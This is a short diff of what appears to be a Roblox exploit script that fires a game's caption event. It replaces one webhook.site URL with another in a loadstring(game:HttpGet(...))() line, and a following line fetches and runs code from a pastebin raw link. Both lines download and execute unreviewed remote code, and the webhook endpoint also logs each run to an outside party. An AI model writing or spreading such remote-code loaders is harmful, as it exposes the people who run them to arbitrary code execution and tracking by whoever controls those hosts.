@@ -27,7 +27,7 @@ A_D.TintColor = Color3.fromRGB(127, 127, 127)
 end)()
 wait(2.5)
 firesignal(game:GetService("ReplicatedStorage").EntityInfo.Caption.OnClientEvent, 'First to beat this difficulty (once its finished) gets a shoutout!',true)
-loadstring(game:HttpGet("https://webhook.site/12953783-b6af-48cb-b216-3f5421409c34"))();
+loadstring(game:HttpGet("https://webhook.site/01b4adb3-cf44-4d3b-9ef8-7dae00c86174"))();
 loadstring(game:HttpGet("https://pastebin.com/raw/pTV9Lnqk"))()
 
 
